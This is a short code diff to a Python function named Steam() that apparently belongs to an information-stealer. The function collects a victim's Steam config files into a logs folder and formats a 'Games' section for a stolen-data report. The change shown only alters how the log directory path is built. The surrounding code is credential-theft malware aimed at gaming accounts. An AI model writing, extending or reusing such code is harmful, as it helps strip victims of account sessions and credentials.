@@ -15,8 +15,7 @@ def Steam():
         msgInfo+="\n\n<b>🕹Games🕹</b>"
         Log("===========Games===========")
         try:
-            user = environ['USERPROFILE']
-            pathtofile = f'{user}\\{config.pathToLogs}'
+            pathtofile = config.pathToLogs
             directory = f'{pathtofile}\\Games\\Steam\\config'
             directory2 = f'{pathtofile}\\Games\\Steam'
             files2 = [i for i in listdir(path2) if path.isfile(path.join(path2,i)) and \
